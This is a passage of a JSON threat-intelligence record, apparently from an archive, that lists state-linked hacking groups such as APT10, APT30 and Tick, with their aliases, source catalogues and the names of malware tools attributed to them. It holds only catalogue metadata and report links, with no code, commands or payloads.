            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1aead86d-0c57-4e3b-b464-a69f6de20cde",
            "created_at": "2023-01-06T13:46:38.318176Z",
            "updated_at": "2025-03-27T02:00:02.803684Z",
            "deleted_at": null,
            "main_name": "DAGGER PANDA",
            "aliases": [
                "IceFog",
                "RedFoxtrot",
                "Red Wendigo",
                "PLA Unit 69010"
            ],
            "source_name": "MISPGALAXY:DAGGER PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a9ee8219-1882-4b1b-bac8-641b1603787d",
            "created_at": "2022-10-25T15:50:23.78263Z",
            "updated_at": "2025-03-27T02:00:55.545647Z",
            "deleted_at": null,
            "main_name": "APT30",
            "aliases": [
                "APT30"
            ],
            "source_name": "MITRE:APT30",
            "tools": [
                "SHIPSHAPE",
                "FLASHFLOOD",
                "NETEAGLE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b98eb1ec-dc8b-4aea-b112-9e485408dd14",
            "created_at": "2022-10-25T16:07:23.649308Z",
            "updated_at": "2025-03-27T02:02:09.906895Z",
            "deleted_at": null,
            "main_name": "FunnyDream",
            "aliases": [
                "Bronze Edgewood",
                "Red Hariasa",
                "TAG-16"
            ],
            "source_name": "ETDA:FunnyDream",
            "tools": [
                "Chinoxy",
                "Filepak",
                "FilepakMonitor",
                "FunnyDream",
                "Keyrecord",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Md_client",
                "PCShare",
                "ScreenCap",
                "TcpBridge",
                "Tcp_transfer",
                "ccf32"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "30ed778d-15b3-484e-a90b-e1e05b36a42f",
            "created_at": "2023-01-06T13:46:38.290626Z",
            "updated_at": "2025-03-27T02:00:02.795711Z",
            "deleted_at": null,
            "main_name": "APT30",
            "aliases": [
                "G0013"
            ],
            "source_name": "MISPGALAXY:APT30",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ec14074c-8517-40e1-b4d7-3897f1254487",
            "created_at": "2023-01-06T13:46:38.300905Z",
            "updated_at": "2025-03-27T02:00:02.799108Z",
            "deleted_at": null,
            "main_name": "APT10",
            "aliases": [
                "TA429",
                "STONE PANDA",
                "POTASSIUM",
                "Red Apollo",
                "HOGFISH",
                "Cloud Hopper",
                "BRONZE RIVERSIDE",
                "ATK41",
                "G0045",
                "Menupass Team",
                "happyyongzi",
                "CVNX",
                "Granite Taurus"
            ],
            "source_name": "MISPGALAXY:APT10",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ba3fff0c-3ba0-4855-9eeb-1af9ee18136a",
            "created_at": "2022-10-25T15:50:23.298889Z",
            "updated_at": "2025-03-27T02:00:55.433541Z",
            "deleted_at": null,
            "main_name": "menuPass",
            "aliases": [
                "menuPass",
                "POTASSIUM",
                "Stone Panda",
                "APT10",
                "Red Apollo",
                "CVNX",
                "HOGFISH",
                "BRONZE RIVERSIDE"
            ],
            "source_name": "MITRE:menuPass",
            "tools": [
                "certutil",
                "FYAnti",
                "UPPERCUT",
                "SNUGRIDE",
                "P8RAT",
                "RedLeaves",
                "SodaMaster",
                "pwdump",
                "Mimikatz",
                "PlugX",
                "PowerSploit",
                "ChChes",
                "cmd",
                "QuasarRAT",
                "AdFind",
                "Cobalt Strike",
                "PoisonIvy",
                "EvilGrab",
                "esentutl",
                "Impacket",
                "Ecipekac",
                "PsExec",
                "HUI Loader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ba9fa308-a29a-4928-9c06-73aafec7624c",
            "created_at": "2024-05-01T02:03:07.981061Z",
            "updated_at": "2025-03-27T02:05:17.28602Z",
            "deleted_at": null,
            "main_name": "BRONZE RIVERSIDE",
            "aliases": [
                "CTG-5938 ",
                "CVNX ",
                "Hogfish ",
                "MenuPass ",
                "POTASSIUM ",
                "Red Apollo ",
                "Stone Panda ",
                "APT10 "
            ],
            "source_name": "Secureworks:BRONZE RIVERSIDE",
            "tools": [
                " ChChes",
                " Cobalt Strike",
                " PlugX",
                " PoisonIvy",
                " QuasarRAT",
                " QuasarRAT Loader",
                " RedLeaves",
                "ANEL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ad154227-6fcf-43c5-a540-0c09534e040f",
            "created_at": "2024-05-01T02:03:07.952927Z",
            "updated_at": "2025-03-27T02:05:17.267077Z",
            "deleted_at": null,
            "main_name": "BRONZE GENEVA",
            "aliases": [
                "BRONZE STERLING ",
                "CTG-5326 ",
                "Naikon ",
                "Override Panda ",
                "APT30 "
            ],
            "source_name": "Secureworks:BRONZE GENEVA",
            "tools": [
                " ShadowPad",
                "Lecna"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bbb1ee4e-bbe9-44de-8f46-8e7fec09f695",
            "created_at": "2022-10-25T16:07:24.120424Z",
            "updated_at": "2025-03-27T02:02:10.112981Z",
            "deleted_at": null,
            "main_name": "RedFoxtrot",
            "aliases": [
                "Moshen Dragon",
                "Nomad Panda",
                "TEMP.Trident"
            ],
            "source_name": "ETDA:RedFoxtrot",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Fucobha",
                "GUNTERS",
                "Gen:Trojan.Heur.PT",
                "Icefog",
                "Impacket",
                "Kaba",
                "Korplug",
                "PCShare",
                "POISONPLUG.SHADOW",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "XShellGhost",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1678759779,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1678715324,
    "ts_modification_date": 1678715324,
    "files": {
        "pdf": "https://archive.orkl.eu/d1a6a9b7fbd5a94cdd7b325883da3e413d4f8ffc.pdf",
        "text": "https://archive.orkl.eu/d1a6a9b7fbd5a94cdd7b325883da3e413d4f8ffc.txt",
        "img": "https://archive.orkl.eu/d1a6a9b7fbd5a94cdd7b325883da3e413d4f8ffc.jpg"
    }
}